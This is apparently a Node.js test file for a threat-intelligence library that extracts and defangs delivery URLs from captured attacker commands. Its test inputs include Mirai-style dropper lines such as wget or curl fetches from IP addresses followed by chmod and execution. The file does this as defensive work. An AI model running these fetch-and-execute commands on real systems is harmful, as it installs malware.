const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { extractUrls, hostOf, isIp, defangIp, defangUrl } = require('../lib/urls');

/**
 * A missed shape here is a delivery host nobody ever sees, which is the whole
 * value of the feature. These are drawn from real captured commands.
 */
describe('extractUrls', () => {
  test('finds a plain wget', () => {
    assert.deepEqual(extractUrls('wget http://1.2.3.4/bins.sh'), ['http://1.2.3.4/bins.sh']);
  });

  test('finds a fetch with the scheme left off, as Mirai droppers write it', () => {
    assert.deepEqual(extractUrls('wget 45.61.187.220/arm7'), ['http://45.61.187.220/arm7']);
  });

  test('finds several in one chained command', () => {
    const urls = extractUrls('cd /tmp; wget http://a.example/x.sh; curl -O http://9.9.9.9:8080/y');
    assert.equal(urls.length, 2);
  });

  test('handles tftp and ftp, which busybox droppers still use', () => {
    assert.deepEqual(extractUrls('tftp://10.0.0.1/x'), ['tftp://10.0.0.1/x']);
    assert.deepEqual(extractUrls('ftp://10.0.0.2/y'), ['ftp://10.0.0.2/y']);
  });

  test('stops at shell metacharacters rather than swallowing the rest', () => {
    // `wget http://x/y.sh;chmod +x y.sh` must not yield "y.sh;chmod".
    assert.deepEqual(extractUrls('wget http://x/y.sh;chmod +x y.sh'), ['http://x/y.sh']);
    assert.deepEqual(extractUrls('wget http://x/y.sh && ./y.sh'), ['http://x/y.sh']);
    assert.deepEqual(extractUrls('curl "http://x/y.sh"'), ['http://x/y.sh']);
  });

  test('deduplicates a URL repeated in one command', () => {
    assert.deepEqual(
      extractUrls('wget http://x/a || curl http://x/a'),
      ['http://x/a']
    );
  });

  test('finds nothing in an ordinary command', () => {
    assert.deepEqual(extractUrls('cat /proc/cpuinfo | grep name'), []);
    assert.deepEqual(extractUrls('uname -a'), []);
  });

  test('does not treat a bare IP with no path as a fetch', () => {
    // `ssh root@1.2.3.4` is a pivot, not a download.
    assert.deepEqual(extractUrls('ssh root@1.2.3.4'), []);
  });

  test('survives null and empty input', () => {
    assert.deepEqual(extractUrls(null), []);
    assert.deepEqual(extractUrls(''), []);
    assert.deepEqual(extractUrls(undefined), []);
  });
});

describe('hostOf', () => {
  test('strips scheme, port, path and credentials', () => {
    assert.equal(hostOf('http://1.2.3.4/bins.sh'), '1.2.3.4');
    assert.equal(hostOf('http://9.9.9.9:8080/a/b'), '9.9.9.9');
    assert.equal(hostOf('http://user:pw@evil.example/x'), 'evil.example');
    assert.equal(hostOf('https://EVIL.Example/X'), 'evil.example');
  });

  test('handles a query string and fragment', () => {
    assert.equal(hostOf('http://x.example?a=1'), 'x.example');
    assert.equal(hostOf('http://x.example#frag'), 'x.example');
  });
});

describe('isIp', () => {
  test('separates addresses from names, since only addresses can be geo-enriched', () => {
    assert.equal(isIp('1.2.3.4'), true);
    assert.equal(isIp('evil.example'), false);
    assert.equal(isIp('1.2.3'), false);
  });
});

describe('defangUrl', () => {
  test('neuters the scheme and brackets the host, leaving the path readable', () => {
    assert.equal(defangUrl('http://1.2.3.4/bins.sh'), 'hxxp://1.2.3[.]4/bins.sh');
  });

  test('an address defangs identically with or without a port', () => {
    // Production shipped these two lines side by side in one export:
    //   hxxp://176.65.139[.]89/bot     and     hxxp://106[.]13[.]23[.]149:6819/linux
    // The port rode along in the host capture, so the address test failed and
    // the name branch bracketed every dot.
    assert.equal(defangUrl('http://106.13.23.149:6819/linux'), 'hxxp://106.13.23[.]149:6819/linux');
    assert.equal(defangUrl('http://106.13.23.149/linux'), 'hxxp://106.13.23[.]149/linux');
  });

  test('a name brackets every dot, which is the convention for domains', () => {
    assert.equal(
      defangUrl('https://raw.githubusercontent.com/a/b.sh'),
      'hxxps://raw[.]githubusercontent[.]com/a/b.sh'
    );
  });

  test('a name keeps its port too', () => {
    assert.equal(defangUrl('http://evil.example:8080/x'), 'hxxp://evil[.]example:8080/x');
  });

  test('a bare host with no scheme still defangs', () => {
    assert.equal(defangUrl('1.2.3.4'), '1.2.3[.]4');
    assert.equal(defangUrl('evil.example'), 'evil[.]example');
  });

  test('an address matches defangIp exactly, so ?type=ips and ?type=urls agree', () => {
    for (const ip of ['1.2.3.4', '35.237.91.38', '106.13.23.149']) {
      assert.equal(defangUrl(`http://${ip}/x`), `hxxp://${defangIp(ip)}/x`);
    }
  });

  test('leaves a query string and fragment on the path side', () => {
    assert.equal(defangUrl('http://1.2.3.4/x?a=1#f'), 'hxxp://1.2.3[.]4/x?a=1#f');
  });
});
